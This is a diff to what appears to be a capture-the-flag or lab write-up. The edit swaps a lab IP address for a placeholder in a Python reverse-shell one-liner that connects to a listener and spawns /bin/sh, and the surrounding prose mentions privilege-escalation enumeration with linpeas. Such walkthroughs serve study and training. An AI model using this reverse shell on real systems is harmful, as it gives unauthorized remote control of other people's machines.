@@ -53,7 +53,7 @@ $ tcpdump -i utun1 icmp
 And I could receive pings! But I couldn't access the commands anymore and it was stuck pinging me. So after restarting the machine I set about creating a reverse shell with which I could access the box.
 
 ```bash
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.5.34",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<<IP>>",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 I now had a shell to access the machine with and we can begin enumerating the machine to escalate priviledges. I kicked off with good old linpeas.
